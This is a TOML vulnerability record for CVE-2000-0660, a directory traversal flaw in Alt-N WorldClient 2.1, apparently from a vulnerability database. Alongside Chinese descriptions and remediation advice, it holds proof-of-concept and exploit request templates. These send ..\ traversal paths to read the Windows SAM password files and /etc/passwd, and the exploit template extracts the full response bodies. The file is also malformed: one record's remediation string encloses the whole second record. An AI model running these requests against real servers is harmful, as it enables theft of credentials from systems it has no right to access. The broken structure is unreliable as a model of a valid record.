[basic]
description = "alt-n WorldClient 2.1 的 WDaemon Web 服务器存在目录遍历漏洞。远程攻击者无需身份认证即可通过向目标服务器发送包含 `..`（点点）序列的特制 HTTP 请求，绕过路径限制读取服务器上的任意文件。该漏洞可导致敏感信息泄露（如配置文件、系统文件等），影响运行 WorldClient 2.1 的邮件服务器。攻击条件简单，仅需目标开放 Web 服务端口即可利用。"
published = "2000-07-12T04:00:00Z"
remediation = '''
[id]
ave_id = "AVE-2000-00001"
aliases = ["CVE-2000-0660", "GHSA-r4c5-4hcj-q3cc"]

[basic]
title = "Alt-N WorldClient 2.1 WDaemon Web服务器目录遍历漏洞"
description = "Alt-N WorldClient 2.1 的 WDaemon Web 服务器组件存在目录遍历漏洞。远程攻击者无需认证即可通过向服务器发送包含 ..（点号点号）或 ..\ 序列的特制 HTTP 请求，绕过路径限制读取服务器上任意已知位置的文件，如系统敏感文件 sam._。该漏洞源于服务器未对用户请求中的路径进行充分过滤和规范化处理。"
severity = "MEDIUM"
score = 5.0
sources = ["cve", "exploitdb"]
published = "2000-07-12"
updated = "2024-06-16"
remediation = "升级到 WorldClient 2.1 之后的最新版本，或迁移至 Alt-N 后续产品 MDaemon 的受支持版本。由于该产品已停止维护，建议更换为仍在安全更新周期内的邮件服务器软件。"

[references]
urls = ["http://archives.neohapsis.com/archives/bugtraq/2000-07/0173.html", "http://www.securityfocus.com/bid/1462", "https://exchange.xforce.ibmcloud.com/vulnerabilities/4913", "https://www.exploit-db.com/exploits/20070", "http://www.osvdb.org/1459"]

[exploit]
poc_urls = ["https://www.exploit-db.com/exploits/20070"]
exp_urls = ["https://www.exploit-db.com/exploits/20070"]

[meta]
status = "completed"
collected_at = "2026-07-28T00:00:00Z"

[info]
id = "POC-AVE-2000-00001"
name = "CVE-2000-0660 PoC"
author = "AVE"
severity = "medium"
tags = ["cve-2000-0660", "directory-traversal", "worldclient"]
description = "检测 Alt-N WorldClient 2.1 WDaemon 服务器是否存在目录遍历漏洞，通过发送包含 ..\ 序列的 HTTP 请求尝试读取系统文件"
vuln_id = ["CVE-2000-0660", "AVE-2000-00001"]

[poc]
logic = "any"

[[poc.requests]]
protocol = "http"
method = "GET"
path = "/{{BaseURL}}/..\\..\\..\\winnt\\repair\\sam._"
headers = { "User-Agent" = "AVE/1.0" }

[[poc.requests.matchers]]
type = "word"
words = ["SAM", "boot key", "Administrator"]
expect = true

[[poc.requests]]
protocol = "http"
method = "GET"
path = "/{{BaseURL}}/..\\..\\..\\..\\etc\\passwd"
headers = { "User-Agent" = "AVE/1.0" }

[[poc.requests.matchers]]
type = "word"
words = ["root:", "nobody:"]
expect = true

[info]
id = "EXP-AVE-2000-00001"
name = "CVE-2000-0660 EXP"
author = "AVE"
severity = "medium"
tags = ["cve-2000-0660", "directory-traversal", "worldclient"]
description = "利用 Alt-N WorldClient 2.1 WDaemon 目录遍历漏洞读取远程服务器任意文件"
vuln_id = ["CVE-2000-0660", "AVE-2000-00001"]

[poc]
logic = "any"

[[poc.requests]]
protocol = "http"
method = "GET"
path = "/{{BaseURL}}/..\\..\\..\\winnt\\repair\\sam._"
headers = { "User-Agent" = "AVE/1.0" }

[[poc.requests.matchers]]
type = "word"
words = ["SAM", "boot key", "Administrator"]
expect = true

[[poc.requests.extractors]]
type = "regex"
part = "body"
name = "sam_content"
regex = ["(.+)"]
group = 1

[[poc.requests]]
protocol = "http"
method = "GET"
path = "/{{BaseURL}}/..\\..\\..\\..\\winnt\\system32\\config\\sam"
headers = { "User-Agent" = "AVE/1.0" }

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.extractors]]
type = "regex"
part = "body"
name = "sam_binary"
regex = ["(.+)"]
group = 1
'''
